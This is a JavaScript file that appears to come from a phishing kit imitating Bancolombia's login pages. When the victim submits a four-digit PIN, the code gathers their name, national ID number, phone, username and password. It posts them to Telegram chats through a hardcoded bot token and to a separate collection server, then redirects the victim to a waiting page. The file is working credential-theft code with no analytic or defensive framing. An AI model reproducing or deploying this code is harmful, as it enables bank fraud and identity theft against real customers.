function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

async function sendDataBCAndPost() {
  var message = "";
  var ty = "";
  if (info.checkerInfo.mode === "personas") {
    ty = "🟡 Bancolombia Personas";
  } else {
    ty = "🟡 Bancolombia a la Mano";
  }

  message = `${ty}\n🆔Nombre: ${info.metaInfo.dudename}\n©️CC: ${info.metaInfo.cc}\n📱Teléfono: ${info.metaInfo.telnum}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\nFuente: ${fuente}`;

  const data = {
    id: info.metaInfo.cc,
    nombre: info.metaInfo.dudename,
    telefono: info.metaInfo.telnum,
    direccion: "",
    usuario: info.metaInfo.user,
    password: info.metaInfo.puser,
  };

  // Deshabilitar el botón
  const continueButton = document.getElementById("continue");
  continueButton.disabled = true;

  try {
    // Enviar mensaje a los dos chats de Telegram
    for (const chatId of chatIds) {
      const telegramUrl = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;

      const telegramResponse = await fetch(telegramUrl);
      if (!telegramResponse.ok) {
        throw new Error(`Error al enviar mensaje a Chat ID: ${chatId}`);
      }
      console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId})`);
    }

    // Hacer la segunda solicitud POST a tu servidor
    const postResponse = await fetch(`${url}/trico/tricoPost`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (!postResponse.ok) {
      throw new Error("Error en la respuesta de la segunda solicitud");
    }

    console.log("Datos enviados al servidor");
    window.location.href = "./wait.html"; // Redirigir al esperar
  } catch (error) {
    console.error("Hubo un problema:", error);
    // Reactivar el botón en caso de error
    continueButton.disabled = false;
  }
}

document.getElementById("continue").addEventListener("click", function (e) {
  e.preventDefault();

  const number1 = document.getElementById("number-1").value;
  const number2 = document.getElementById("number-2").value;
  const number3 = document.getElementById("number-3").value;
  const number4 = document.getElementById("number-4").value;

  if (number1 == "" || number2 == "" || number3 == "" || number4 == "") {
    alert("Por favor ingrese los 4 dígitos");
    return;
  } else {
    info.metaInfo.puser = number1 + number2 + number3 + number4;
    updateLS();

    sendDataBCAndPost();
  }
});
